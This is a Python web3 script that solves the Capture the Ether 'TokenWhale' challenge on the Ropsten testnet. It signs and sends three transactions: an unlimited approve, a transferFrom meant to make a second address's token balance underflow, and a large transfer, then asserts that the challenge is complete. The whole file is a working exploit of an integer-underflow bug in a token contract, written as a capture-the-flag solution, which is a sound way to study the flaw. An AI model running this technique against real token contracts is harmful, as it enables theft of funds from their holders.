from web3 import Web3
from config import CONFIG
from solcx import compile_source

w3 = Web3(Web3.HTTPProvider(CONFIG["INFURA_URL_ROPSTEN"]))

CONTRACT_ADDRESS = "0xb20FBd3C7751cCcB71631c5967822FEf4De2C419"

with open('CTE_Contracts/TokenWhaleChallenge.sol', 'r') as file:
    challenge_code = file.read()

compiled_sol = compile_source(challenge_code, solc_version="0.4.21")

contract_id, contract_interface = compiled_sol.popitem()
abi = contract_interface["abi"]

contract = w3.eth.contract(address=CONTRACT_ADDRESS, abi=abi)

#approve
tx = contract.functions.approve(CONFIG["ADDRESS_2"], 2**256-1).buildTransaction({
    "nonce": w3.eth.getTransactionCount(CONFIG["ADDRESS_1"]),
    "gas": 3000000,
    "gasPrice": w3.toWei('5', "gwei")
})
signed_tx = w3.eth.account.signTransaction(tx, private_key=CONFIG["PRIVATE_KEY_1"])
tx_hash = w3.eth.sendRawTransaction(signed_tx.rawTransaction)
print(w3.toHex(tx_hash))
receipt = w3.eth.waitForTransactionReceipt(tx_hash)

#1st transfer - cause balance of address 2 to underflow
tx = contract.functions.transferFrom(CONFIG["ADDRESS_1"], CONFIG["ADDRESS_1"], 1).buildTransaction({
    "nonce": w3.eth.getTransactionCount(CONFIG["ADDRESS_2"]),
    "gas": 3000000,
    "gasPrice": w3.toWei('5', "gwei")
})
signed_tx = w3.eth.account.signTransaction(tx, private_key=CONFIG["PRIVATE_KEY_2"])
tx_hash = w3.eth.sendRawTransaction(signed_tx.rawTransaction)
print(w3.toHex(tx_hash))
receipt = w3.eth.waitForTransactionReceipt(tx_hash)

#2nd transfer
tx = contract.functions.transfer(CONFIG["ADDRESS_1"], 1000000).buildTransaction({
    "nonce": w3.eth.getTransactionCount(CONFIG["ADDRESS_2"]),
    "gas": 3000000,
    "gasPrice": w3.toWei('5', "gwei")
})
signed_tx = w3.eth.account.signTransaction(tx, private_key=CONFIG["PRIVATE_KEY_2"])
tx_hash = w3.eth.sendRawTransaction(signed_tx.rawTransaction)
print(w3.toHex(tx_hash))
receipt = w3.eth.waitForTransactionReceipt(tx_hash)

assert contract.functions.isComplete().call()
